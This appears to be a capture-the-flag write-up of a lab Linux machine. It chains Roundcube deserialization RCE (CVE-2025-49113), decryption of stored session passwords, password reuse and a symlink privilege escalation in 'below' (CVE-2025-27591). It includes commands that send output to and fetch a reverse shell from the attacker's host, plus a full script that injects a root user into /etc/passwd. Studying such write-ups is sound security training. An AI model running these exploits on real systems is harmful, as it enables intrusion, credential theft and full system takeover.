@@ -1,0 +1,449 @@
+---
+layout: post
+title: "Outbound"
+date: 2025-10-14 03:00:00 -0400
+author: Hugo Beaulieu
+categories: linux machine
+tags: linux docker roundcube cve-2025-49113 mysql dpapi cve-2025-27591
+---
+
+## Overview
+
+Outbound is a Linux machine featuring a Roundcube webmail application vulnerable to CVE-2025-49113, allowing remote code execution. The exploitation path involves RCE through file upload deserialization, container escape via password reuse, MySQL session decryption using Roundcube's DES key, and privilege escalation through CVE-2025-27591 in the `below` monitoring tool.
+
+## Initial Enumeration
+
+### Nmap Scan
+
+We start with a standard nmap scan:
+
+```bash
+nmap -sV -v 10.129.243.86
+```
+
+Results:
+
+```
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+```
+
+### Web Application Discovery
+
+Accessing the website on port 80, we're redirected to:
+
+```
+http://mail.outbound.htb/
+```
+
+We add this to our hosts file:
+
+```bash
+echo "10.129.243.86 mail.outbound.htb" | sudo tee -a /etc/hosts
+```
+
+### Subdomain Enumeration
+
+We attempt subdomain enumeration with ffuf but find no additional subdomains:
+
+```bash
+ffuf -w /home/bhugo97/.pentest-toolbox/wordlists/subdomain-wordlist.txt \
+  -u http://outbound.htb:80 \
+  -H 'Host: FUZZ.outbound.htb' \
+  -fs 154 -o ffuf_output.json -t 64 -v
+```
+
+### Roundcube Webmail
+
+The site is running **Roundcube webmail**. We're provided with starting credentials `tyler:LhKL1o9Nm3X2`, but they don't work for the Roundcube login or SSH.
+
+### UDP Scanning
+
+Since TCP enumeration yields limited results, we run a UDP scan:
+
+```bash
+nmap -sU --top-ports 1000 -A -T4 -v -oN 16h25_[2025-10-03]_mail.outbound.htb_nmap.txt mail.outbound.htb
+```
+
+While this runs in the background, we continue with vulnerability research.
+
+## CVE-2025-49113 Exploitation
+
+### Identifying the Vulnerability
+
+We research known Roundcube vulnerabilities and discover **CVE-2025-49113**, which affects multiple Roundcube versions (1.5.0 - 1.6.10).
+
+### Exploit Proof of Concept
+
+We find a PHP exploit on GitHub. The key vulnerability is in the file upload functionality, which allows serialized PHP object injection leading to remote code execution.
+
+Here's the exploit code structure:
+
+```php
+<?php
+class Crypt_GPG_Engine
+{
+    public $_process = false;
+    public $_gpgconf = '';
+    public $_homedir = '';
+
+    public function __construct($_gpgconf)
+    {
+        $_gpgconf = base64_encode($_gpgconf);
+        $this->_gpgconf = "echo \"{$_gpgconf}\"|base64 -d|sh;#";
+    }
+
+    public function gadget()
+    {
+        return '|'. serialize($this) . ';';
+    }
+}
+
+function checkVersion($baseUrl) {
+    // Checks if Roundcube version is vulnerable
+    // Looks for rcversion in JavaScript
+}
+
+function login($baseUrl, $user, $pass) {
+    // Authenticates to Roundcube
+    // Extracts CSRF token and session cookies
+}
+
+function uploadImage($baseUrl, $sessionCookie, $authCookie, $gadget) {
+    // Uploads malicious image with serialized payload as filename
+}
+
+function exploit($baseUrl, $user, $pass, $rceCommand) {
+    // Coordinates the full exploit chain
+}
+```
+
+### Testing the Exploit
+
+We test if the exploit works by making the target reach out to our server:
+
+```bash
+# Terminal 1: Start HTTP server
+python3 -m http.server 8000
+
+# Terminal 2: Run exploit
+php CVE-2025-49113.php http://mail.outbound.htb/ tyler LhKL1o9Nm3X2 'curl http://10.10.15.79:8000/$(whoami)'
+```
+
+We receive a connection confirming RCE:
+
+```
+10.129.236.232 - - [03/Oct/2025 19:04:48] "GET /www-data HTTP/1.1" 404 -
+```
+
+Success! We're executing commands as `www-data`.
+
+### Uploading a Reverse Shell
+
+We upload a PHP reverse shell:
+
+```bash
+php CVE-2025-49113.php http://mail.outbound.htb/ tyler LhKL1o9Nm3X2 \
+  'wget -O /var/www/html/roundcube/public_html/shell.php http://10.10.15.79:8000/shell.php'
+```
+
+Then access the shell via the browser to trigger it, and we get a reverse shell as `www-data`.
+
+## Container Environment Discovery
+
+### Switching to Tyler
+
+We're able to switch to the tyler user with the provided credentials:
+
+```bash
+su tyler
+# Password: LhKL1o9Nm3X2
+```
+
+### LinPEAS Enumeration
+
+Running LinPEAS reveals several key findings:
+
+#### Mail Directory Analysis
+
+```bash
+262406      4 -rw-rw----   1 jacob    mail         2169 Jun  8 12:10 /var/mail/jacob
+12353       0 -rw-rw----   1 mel      mail            0 Jun  8 12:06 /var/mail/mel
+16021       0 -rw-rw----   1 tyler    mail            0 Jun  8 13:28 /var/mail/tyler
+```
+
+Jacob has significantly more mail than other users, suggesting he might be an administrator.
+
+#### Roundcube Configuration
+
+In `/var/www/html/roundcube/config/config.inc.php`:
+
+```php
+$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';
+$config['imap_host'] = 'localhost:143';
+$config['smtp_host'] = 'localhost:587';
+$config['des_key'] = 'rcmail-!24ByteDESkey*Str';
+```
+
+Key findings:
+- MySQL credentials: `roundcube:RCDBPass2025`
+- Roundcube DES key for encrypting stored passwords
+
+## MySQL Database Exploration
+
+### Connecting to MySQL
+
+```bash
+mysql -u roundcube -p'RCDBPass2025' -S /run/mysqld/mysqld.sock roundcube
+```
+
+### Examining Tables
+
+```sql
+SHOW TABLES;
+```
+
+Tables of interest:
+- users
+- session
+- identities
+
+### Users Table
+
+```sql
+SELECT * FROM users;
+```
+
+Results:
+
+```
+user_id  username  mail_host  created              last_login
+1        jacob     localhost  2025-06-07 13:55:18  2025-06-11 07:52:49
+2        mel       localhost  2025-06-08 12:04:51  2025-06-08 13:29:05
+3        tyler     localhost  2025-06-08 13:28:55  2025-10-06 18:46:12
+```
+
+### Session Table
+
+```sql
+SELECT * FROM session;
+```
+
+The session contains base64-encoded PHP session data:
+
+```
+sess_id: 6a5ktqih5uca6lj8vrmgh9v0oh
+changed: 2025-06-08 15:46:40
+ip: 172.17.0.1
+vars: bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjth...
+```
+
+### Decoding Session Data
+
+We decode the base64 session data:
+
+```bash
+echo "bGFuZ3VhZ2V8czo1OiJlbl9VUyI7..." | base64 -d
+```
+
+This reveals jacob's encrypted password:
+
+```
+password|s:32:"L7Rv00A8TuwJAr67kITxxcSgnIk25Am/";
+```
+
+### Decrypting the Password
+
+We use Roundcube's built-in decryption with the DES key:
+
+```bash
+php -r "
+require_once '/var/www/html/roundcube/program/lib/Roundcube/bootstrap.php';
+
+\$rcube = rcube::get_instance();
+\$rcube->config->set('des_key', 'rcmail-!24ByteDESkey*Str');
+
+\$encrypted = 'L7Rv00A8TuwJAr67kITxxcSgnIk25Am/';
+\$password = \$rcube->decrypt(\$encrypted);
+
+echo 'Password: ' . \$password . PHP_EOL;
+"
+```
+
+Result:
+
+```
+Password: 595mO8DmwGeD
+```
+
+### Switching to Jacob
+
+```bash
+su jacob
+# Password: 595mO8DmwGeD
+```
+
+## Container Escape via SSH
+
+### Reading Jacob's Mail
+
+```bash
+cat /var/mail/jacob
+```
+
+We find two important emails:
+
+#### Email 1: From Tyler
+
+```
+Subject: Important Update
+Date: Sat, 7 Jun 2025 14:00:58 +0000
+
+Due to the recent change of policies your password has been changed.
+
+Please use the following credentials to log into your account: gY4Wr3a1evp4
+
+Remember to change your password when you next log into your account.
+
+Tyler
+```
+
+#### Email 2: From Mel
+
+```
+Subject: Unexpected Resource Consumption
+Date: Sun, 8 Jun 2025 12:09:45 +0000
+
+We have been experiencing high resource consumption on our main server.
+For now we have enabled resource monitoring with Below and have granted you
+privileges to inspect the logs.
+
+Thanks!
+
+Mel
+```
+
+The mention of "main server" confirms we're in a Docker container, and there's a host machine we need to access.
+
+### SSH to the Host
+
+We use jacob's credentials from the email to SSH to the host:
+
+```bash
+ssh jacob@10.129.99.99
+# Password: gY4Wr3a1evp4
+```
+
+Success! We can now retrieve the user flag from jacob's desktop.
+
+## Privilege Escalation via CVE-2025-27591
+
+### Sudo Privileges
+
+Checking sudo permissions:
+
+```bash
+sudo -l
+```
+
+Result:
+
+```
+User jacob may run the following commands on outbound:
+    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*,
+                              !/usr/bin/below --debug*, !/usr/bin/below -d*
+```
+
+Jacob can run the `below` monitoring tool with most options except config/debug flags.
+
+### Researching the Vulnerability
+
+We discover **CVE-2025-27591**, which affects the `below` utility. The vulnerability allows privilege escalation through symlink manipulation in log file creation.
+
+### Exploit Script
+
+```bash
+#!/bin/bash
+
+# CVE-2025-27591 Exploit - Privilege Escalation via 'below'
+
+TARGET="/etc/passwd"
+LINK_PATH="/var/log/below/error_root.log"
+TMP_PAYLOAD="/tmp/payload"
+BACKUP="/tmp/passwd.bak"
+
+echo "[*] CVE-2025-27591 Privilege Escalation Exploit"
+
+# Check for sudo access to below
+echo "[*] Checking sudo permissions..."
+if ! sudo -l | grep -q '/usr/bin/below'; then
+  echo "[!] 'below' is not available via sudo. Exiting."
+  exit 1
+fi
+
+# Backup current /etc/passwd
+echo "[*] Backing up /etc/passwd to $BACKUP"
+cp /etc/passwd "$BACKUP"
+
+# Generate password hash for 'haxor' user (password: hacked123)
+echo "[*] Generating password hash..."
+HASH=$(openssl passwd -6 'hacked123')
+
+# Prepare malicious passwd line
+echo "[*] Creating malicious passwd line..."
+echo "haxor:$HASH:0:0:root:/root:/bin/bash" > "$TMP_PAYLOAD"
+
+# Create symlink
+echo "[*] Linking $LINK_PATH to $TARGET"
+rm -f "$LINK_PATH"
+ln -sf "$TARGET" "$LINK_PATH"
+
+# Trigger log creation with invalid --time to force below to recreate the log
+echo "[*] Triggering 'below' to write to symlinked log..."
+sudo /usr/bin/below replay --time "invalid" >/dev/null 2>&1
+
+# Overwrite passwd file via symlink
+echo "[*] Injecting malicious user into /etc/passwd"
+cat "$TMP_PAYLOAD" > "$LINK_PATH"
+
+# Test access
+echo "[*] Try switching to 'haxor' using password: hacked123"
+su haxor
+```
+
+### Exploitation
+
+Run the exploit:
+
+```bash
+chmod +x exploit.sh
+./exploit.sh
+```
+
+The exploit:
+1. Creates a symlink from `/var/log/below/error_root.log` to `/etc/passwd`
+2. Forces `below` to write to the log file (which is now symlinked to `/etc/passwd`)
+3. Injects a new root user named `haxor` with password `hacked123`
+
+Switch to the new root user:
+
+```bash
+su haxor
+# Password: hacked123
+```
+
+We now have root access and can retrieve the root flag!
+
+## Key Takeaways
+
+- **Roundcube CVE-2025-49113** allows RCE through deserialization in file upload
+- **Default credentials** should always be tested, even if they seem unlikely
+- **MySQL session tables** can contain encrypted passwords
+- **Roundcube DES keys** stored in config files can decrypt stored passwords
+- **Internal emails** often contain credentials for password resets
+- **Container indicators** include references to "main server" or limited network access
+- **Password reuse** across containers and hosts is common in enterprise environments
+- **Monitoring tools with sudo privileges** can be exploited through log manipulation
+- **Symlink attacks** combined with sudo can overwrite critical system files
+- **CVE-2025-27591** in `below` allows privilege escalation via log file symlinks
